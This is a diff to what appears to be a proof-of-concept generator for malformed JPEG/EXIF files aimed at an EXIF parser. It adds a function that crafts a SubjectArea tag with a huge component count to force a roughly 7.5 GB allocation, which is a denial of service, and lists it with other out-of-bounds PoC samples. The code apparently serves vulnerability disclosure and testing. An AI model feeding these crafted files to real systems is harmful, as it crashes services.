@@ -140,12 +140,27 @@ def first_ifd_offset_underflow():
 	return bytes(payload)
 
 
+def subjectarea_alloc_dos():
+	"""parseIFDExif(), tag 0x9214 (SubjectArea): unbounded allocation, not an OOB read.
+
+	SubjectArea's component count is a fully attacker-controlled uint32 taken
+	straight from the entry, with no check against the buffer before the
+	pre-patch parser did `SubjectArea.resize(parser.GetLength())`. The value/
+	offset field is never even read -- a single 12-byte IFD entry is enough.
+	0xdfdfdfdf components as SHORT (2 bytes each) is a ~7.5 GB allocation
+	attempt from a file that is a few dozen bytes.
+	"""
+	body = ifd([entry(0x9214, FMT_SHORT, 0xdfdfdfdf, b'\x00\x00\x00\x00')])
+	return exif_payload(body)
+
+
 SAMPLES = (
 	('poc-rational-oob.jpg', rational_oob),
 	('poc-makernote-oob.jpg', makernote_oob),
 	('poc-subifd-offset-wrap.jpg', subifd_offset_wrap),
 	('poc-lensinfo-offset-wrap.jpg', lensinfo_offset_wrap),
 	('poc-first-ifd-underflow.jpg', first_ifd_offset_underflow),
+	('poc-subjectarea-alloc-dos.jpg', subjectarea_alloc_dos),
 )
 
 
